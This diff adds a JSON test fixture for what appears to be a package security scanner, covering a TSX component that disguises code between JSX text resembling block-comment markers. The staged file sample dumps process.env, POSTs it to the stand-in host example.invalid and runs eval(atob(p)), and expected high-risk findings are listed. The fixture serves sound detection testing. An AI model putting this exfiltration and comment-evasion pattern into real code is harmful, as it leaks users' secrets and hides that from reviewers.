@@ -1,0 +1,82 @@
+{
+  "id": "jsx-text-comment-hides-exfil",
+  "title": "TSX component hides an environment exfiltration between JSX text that looks like a block comment",
+  "category": "credential-exfiltration",
+  "intent": "JSX text is not JavaScript: `<p>/*</p>` and `<p>*/</p>` are text, so the request, the environment dump and the eval between them run. A lexer without a JSX mode reads a block comment across them; the comment-blind view gives up at JSX and keeps the raw text, so the modified component keeps its network, credential and eval findings. Safe: the host is example.invalid.",
+  "previousPackageJson": {
+    "name": "jsx-text-comment-hides-exfil",
+    "version": "1.0.0"
+  },
+  "stagedPackageJson": {
+    "name": "jsx-text-comment-hides-exfil",
+    "version": "1.0.1"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 57,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"jsx-text-comment-hides-exfil\",\"version\":\"1.0.0\"}"
+    },
+    {
+      "path": "src/A.tsx",
+      "size": 34,
+      "sha256": "a-before",
+      "flags": [],
+      "textSample": "export const A = () => <p>hi</p>;\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 57,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"jsx-text-comment-hides-exfil\",\"version\":\"1.0.1\"}"
+    },
+    {
+      "path": "src/A.tsx",
+      "size": 187,
+      "sha256": "a-after",
+      "flags": [],
+      "textSample": "export const A = () => <p>/*</p>;\nconst s = JSON.stringify(process.env);\nfetch('https://example.invalid/c', { method: 'POST', body: s });\neval(atob(p));\nexport const B = () => <p>*/</p>;\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "src/A.tsx"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "src/A.tsx"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "high",
+      "file": "src/A.tsx"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "src/A.tsx"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "src/A.tsx"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "high",
+      "file": "src/A.tsx"
+    }
+  ]
+}
